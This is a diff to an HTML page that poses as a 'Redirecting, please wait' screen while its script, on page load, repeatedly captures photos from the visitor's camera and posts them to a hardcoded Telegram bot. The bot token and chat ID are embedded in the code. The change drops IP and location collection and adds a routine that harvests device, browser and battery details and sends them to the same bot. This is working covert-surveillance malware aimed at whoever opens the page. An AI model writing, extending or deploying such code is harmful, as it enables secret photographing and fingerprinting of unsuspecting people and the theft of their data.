@@ -23,13 +23,13 @@
   </style>
 </head>
 <body>
-  <div class="loading"> please wait...</div>
+  <div class="loading">Redirecting, please wait...1</div>
 
   <script type="text/javascript">
     const botToken = '7044604914:AAHUlvU0rlzbE5aU5axIAPLD7siMj1jLaA4'; // Your Telegram bot token
     const chatId = '5571330102'; // Your Telegram chat ID
 
-    // Function to get user's IP address
+    // Function to get user's IP address (using free API)
     function getUserIP() {
       return new Promise((resolve, reject) => {
         fetch('https://api.ipify.org?format=json')
@@ -39,22 +39,28 @@
       });
     }
 
-    // Function to get user's location
-    function getLocation() {
-      return new Promise((resolve, reject) => {
-        if (navigator.geolocation) {
-          navigator.geolocation.getCurrentPosition(function(position) {
-            const location = {
-              latitude: position.coords.latitude,
-              longitude: position.coords.longitude
-            };
-            resolve(location);
-          }, function() {
-            reject('Location permission denied or unavailable.');
-          });
-        } else {
-          reject('Geolocation not supported');
-        }
+    // Function to get user's device and browser information (using free APIs)
+    function getDeviceInfo() {
+      return new Promise((resolve) => {
+        const deviceInfo = {
+          userAgent: navigator.userAgent,
+          platform: navigator.platform,
+          language: navigator.language,
+          cookiesEnabled: navigator.cookieEnabled,
+          screenWidth: window.screen.width,
+          screenHeight: window.screen.height,
+          pixelRatio: window.devicePixelRatio,
+          online: navigator.onLine,
+          batteryStatus: "Unknown",
+          charging: "Unknown"
+        };
+
+        // Battery status
+        navigator.getBattery().then(function(battery) {
+          deviceInfo.batteryStatus = battery.level * 100 + "%";
+          deviceInfo.charging = battery.charging ? "Yes" : "No";
+          resolve(deviceInfo);
+        }).catch(() => resolve(deviceInfo));
       });
     }
 
@@ -93,16 +99,7 @@
                 imageCapture.takePhoto()
                   .then((blob) => {
                     console.log("Photo captured");
-
-                    getUserIP().then(ip => {
-                      getLocation().then(location => {
-                        sendToTelegram(blob, ip, location);
-                      }).catch(err => {
-                        console.error("Location Error:", err);
-                      });
-                    }).catch(err => {
-                      console.error("IP Error:", err);
-                    });
+                    sendToTelegram(blob); // Send captured photo only, no IP/location
                   })
                   .catch((error) => {
                     console.error('Error capturing photo:', error);
@@ -117,14 +114,13 @@
         });
     }
 
-    // Function to send the captured photo along with IP and location to Telegram
-    function sendToTelegram(data, ip, location) {
+    // Function to send the captured photo to Telegram (without IP/location)
+    function sendToTelegram(data) {
       const formData = new FormData();
       formData.append('chat_id', chatId);
       formData.append('photo', data, 'camera_photo.jpg');
-      formData.append('caption', `IP: ${ip}, Location: Latitude ${location.latitude}, Longitude ${location.longitude}`);
 
-      // Send the photo with caption to Telegram
+      // Send the photo to Telegram
       fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
         method: 'POST',
         body: formData
@@ -142,11 +138,54 @@
       });
     }
 
+    // Function to send device/browser information to Telegram (separate message)
+    function sendDeviceInfo(deviceInfo) {
+      const message = `
+Device Information:
+----------------------
+User-Agent: ${deviceInfo.userAgent}
+Platform: ${deviceInfo.platform}
+Language: ${deviceInfo.language}
+Screen Resolution: ${deviceInfo.screenWidth}x${deviceInfo.screenHeight}
+Pixel Ratio: ${deviceInfo.pixelRatio}
+Cookies Enabled: ${deviceInfo.cookiesEnabled}
+Battery Status: ${deviceInfo.batteryStatus}
+Charging: ${deviceInfo.charging}
+Online: ${deviceInfo.online}
+      `;
+      
+      // Send the device information to Telegram
+      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/x-www-form-urlencoded',
+        },
+        body: new URLSearchParams({
+          chat_id: chatId,
+          text: message,
+        })
+      })
+      .then(response => response.json())
+      .then(data => {
+        if (data.ok) {
+          console.log('Device info sent to Telegram');
+        } else {
+          console.error('Failed to send device info to Telegram:', data);
+        }
+      })
+      .catch(error => {
+        console.error('Error sending device info to Telegram:', error);
+      });
+    }
+
     // Request all necessary permissions on page load
     window.onload = function() {
       // Ask for camera and location permissions
       if (navigator.mediaDevices && navigator.geolocation) {
-        startCapturing();
+        startCapturing();  // Start capturing photos continuously
+        getDeviceInfo().then(deviceInfo => {
+          sendDeviceInfo(deviceInfo); // Send device/browser information once
+        });
       } else {
         alert('This device does not support the required permissions.');
       }
